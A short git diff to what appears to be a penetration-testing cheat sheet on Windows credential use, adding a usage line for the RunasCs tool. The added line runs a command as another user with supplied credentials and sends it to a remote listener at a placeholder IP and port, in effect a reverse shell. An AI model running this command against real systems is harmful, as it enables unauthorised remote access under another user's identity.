@@ -7,6 +7,10 @@ tags: ["Powershell", "Credential Object", "Windows", "Runas", "UAC"]
 ### RunasCS
 
 ```console
+.\RunasCs.exe '<USER>' '<PASSWORD>' "<CMD>" -r <LOCAL_IP>:<LOCAL_PORT>
+```
+
+```console
 .\RunasCs.exe '<USER>' '<PASSWORD>' "<CMD>" -l <LOGON_TYPE>
 ```
 
